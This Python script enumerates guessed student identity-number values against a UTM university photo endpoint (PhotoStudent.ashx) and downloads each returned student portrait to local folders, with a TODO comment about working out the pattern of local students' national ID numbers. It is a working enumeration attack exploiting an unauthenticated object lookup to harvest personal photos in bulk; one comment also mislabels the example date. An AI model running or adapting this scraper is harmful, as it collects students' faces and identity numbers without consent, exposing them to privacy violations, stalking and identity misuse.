import requests
import os

# TODO try to get a pattern for local students. Eg: 020717011689. Or maybe it's related to their ikad idk.
def download_images(year, month, start=10000, end=11000):
    base_url = "https://academic.utm.my/UGStudent/PhotoStudent.ashx?nokp="
    error_count = 0
    max_errors = 15

    # Create directory for the year and month
    directory = f"{year}/{month}"
    if not os.path.exists(directory):
        os.makedirs(directory)

    for i in range(start, end + 1):  # Set range from start to end
        nokp = f"{year}{month}M{i:05d}"  # I wonder what M stands for?
        url = base_url + nokp
        response = requests.get(url)
        if response.status_code == 200 and response.content:
            if len(response.content) > 100:  # Check if the content is likely to be a valid image
                # Save the image
                with open(os.path.join(directory, f"{nokp}.jpg"), "wb") as f:
                    f.write(response.content)
                print(f"Downloaded {nokp}.jpg")
                error_count = 0  # Reset error count after a successful download
            else:
                print(f"Skipping {nokp}.jpg, file appears to be empty or invalid.")
        else:
            error_count += 1
            print(f"Failed to download {nokp}.jpg, error count: {error_count}")
            if error_count >= max_errors:
                print("Maximum error count reached, stopping...")
                break


# Example usage: download images for November 2021, from 10000 to 11000
download_images("2005", "01", 10000, 11000)
# download_images("2006", "01", 10000, 11000)
# download_images("2007", "01", 10000, 11000)
# download_images("2008", "01", 10000, 11000)
# download_images("2009", "01", 10000, 11000)
#download_images("2010", "01", 10000, 11000)
# download_images("2017", "04", 10000, 11000)
# download_images("2017", "05", 10000, 11000)
# download_images("2017", "06", 10000, 11000)
# download_images("2017", "07", 10000, 11000)
# download_images("2017", "08", 10000, 11000)
# download_images("2017", "09", 10000, 11000)
# download_images("2017", "10", 10000, 11000)
# download_images("2017", "11", 10000, 11000)
# download_images("2017", "12", 10000, 11000)
